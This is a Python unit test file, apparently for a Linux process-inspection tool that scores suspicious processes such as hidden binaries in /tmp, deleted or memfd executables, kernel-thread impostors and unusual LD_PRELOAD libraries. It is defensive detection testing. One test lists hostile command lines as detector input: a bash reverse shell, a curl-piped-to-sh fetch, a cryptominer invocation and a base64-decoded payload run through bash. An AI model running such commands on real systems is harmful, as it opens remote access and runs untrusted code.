import unittest

import tests.helpers  # noqa: F401  (ajusta sys.path)
from sm import procinspect as pi


def rec(**kw):
    base = {"pid": 100, "ppid": 1, "name": "x", "cmd": "", "argv0": None, "exe": "/usr/bin/x",
            "exe_verified": True, "user": "user", "peak_cpu": 0}
    base.update(kw)
    return base


def levels(r, pkg="pacote", extra=None):
    return {f["level"] for f in pi.flags_for(r, pkg, extra)}


class FlagsTest(unittest.TestCase):
    def setUp(self):
        self._tool, pi.PKG.tool = pi.PKG.tool, "pacman"

    def tearDown(self):
        pi.PKG.tool = self._tool

    def test_clean_package_binary(self):
        self.assertEqual(pi.flags_for(rec(), "coreutils"), [])

    def test_temp_and_hidden(self):
        r = rec(exe="/tmp/.x", name=".x")
        self.assertEqual(pi.score(pi.flags_for(r, None)), 100)

    def test_deleted_binary(self):
        self.assertIn("alto", levels(rec(exe="/opt/app/bin (deleted)"), pkg=None))
        # atualizado pelo pacote: só informativo
        self.assertEqual(levels(rec(exe="/usr/bin/x (deleted)"), pkg="x"), {"info"})

    def test_memfd(self):
        self.assertIn("alto", levels(rec(exe="/memfd:abc (deleted)"), pkg=None))

    def test_kernel_thread_masquerade(self):
        r = rec(name="sleep", argv0="[kworker/0:1]", cmd="[kworker/0:1] 30")
        self.assertIn("alto", levels(r))

    def test_cmdline_rules(self):
        for cmd in ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "curl -s http://x | sh",
                    "xmrig --url stratum+tcp://pool:3333", "echo aGk= | base64 -d | bash"):
            self.assertIn("alto", levels(rec(cmd=cmd)), cmd)

    def test_interpreter_script_vs_argument(self):
        self.assertIn("alto", levels(rec(exe="/usr/bin/python3", name="python3", cmd="python3 /tmp/x.py")))
        self.assertNotIn("alto", levels(rec(exe="/usr/bin/python3", name="python3",
                                            cmd="python3 server.py --config /tmp/c.toml")))

    def test_container_not_flagged_by_package(self):
        r = rec(exe="/usr/libexec/pv-adverb", container=True)
        self.assertEqual(levels(r, pkg=None), {"info"})

    def test_ld_preload(self):
        self.assertIn("medio", levels(rec(), extra={"ld_preload": "/home/u/.x/evil.so"}))
        self.assertEqual(levels(rec(), extra={"ld_preload": "/usr/lib/libmozsandbox.so"}), {"info"})

    def test_system_dir_without_package(self):
        self.assertIn("medio", levels(rec(exe="/usr/bin/estranho"), pkg=None))


if __name__ == "__main__":
    unittest.main()
